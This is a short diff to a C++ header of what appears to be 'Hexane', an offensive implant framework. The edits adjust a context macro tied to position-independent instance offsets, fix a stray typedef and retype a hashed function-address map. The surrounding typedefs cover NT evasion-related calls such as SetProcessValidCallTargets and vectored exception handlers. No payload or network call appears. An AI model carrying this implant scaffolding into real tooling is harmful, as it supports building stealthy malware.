@@ -1,6 +1,7 @@
 #ifndef HEXANE_MONOLITH_HPP
 #define HEXANE_MONOLITH_HPP
 #include <core/ntimports.hpp>
+#include <core/include/names.hpp>
 
 EXTERN_C ULONG __instance;
 EXTERN_C LPVOID InstStart();
@@ -25,7 +26,7 @@ EXTERN_C LPVOID InstEnd();
 #define MIN(a,b)								    (a < b ? a : b)
 
 #define GLOBAL_OFFSET								(U_PTR(InstStart()) + U_PTR(&__instance))
-#define HEXANE 		    							auto Ctx = R_CAST(_hexane*, C_DREF(C_PTR(GLOBAL_OFFSET)));
+#define Ctx 		    							R_CAST(_hexane*, C_DREF(GLOBAL_OFFSET))
 
 #define C_CAST(T,x)								    (const_cast<T>(x))
 #define D_CAST(T,x)								    (dynamic_cast<T>(x))
@@ -225,7 +226,6 @@ typedef NTSTATUS(NTAPI* RtlDestroyProcessParameters_t)(PRTL_USER_PROCESS_PARAMET
 typedef NTSTATUS (NTAPI* RtlGetVersion_t)(PRTL_OSVERSIONINFOW lpVersionInformation);
 typedef ULONG (NTAPI* RtlRandomEx_t)(PULONG Seed);
 
-typedef
 typedef BOOL (WINAPI* SetProcessValidCallTargets_t)(HANDLE hProcess, PVOID VirtualAddress, SIZE_T RegionSize, ULONG NumberOfOffsets, PCFG_CALL_TARGET_INFO OffsetInformation);
 typedef PVOID (NTAPI* RtlAddVectoredExceptionHandler_t)(ULONG First, PVECTORED_EXCEPTION_HANDLER Handler);
 typedef ULONG (NTAPI* RtlRemoveVectoredExceptionHandler_t)(PVOID Handle);
@@ -383,7 +383,7 @@ struct _command_map{
 
 struct _hash_map{
 	uint32_t    name;
-	void		*address;
+	uintptr_t	address;
 };
 
 struct LdrpVectorHandlerEntry {
